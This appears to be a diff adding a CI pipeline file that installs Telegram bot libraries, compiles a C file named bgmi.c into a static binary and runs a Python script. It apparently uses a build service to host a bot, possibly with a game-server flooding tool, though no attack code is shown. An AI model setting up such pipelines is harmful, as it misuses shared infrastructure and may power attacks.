@@ -1,0 +1,11 @@
+pipelines:
+  default:
+    - step:
+        name: Run Python Script
+        image: python:3.10
+        script:
+          - echo "MADE BY ULTRA BHAI.."
+          - pip install telebot pymongo aiohttp psutil pytz python-telegram-bot
+          - gcc -o SHYAM bgmi.c -lpthread -static
+          - chmod +x SHYAM
+          - python3 SHYAM.py
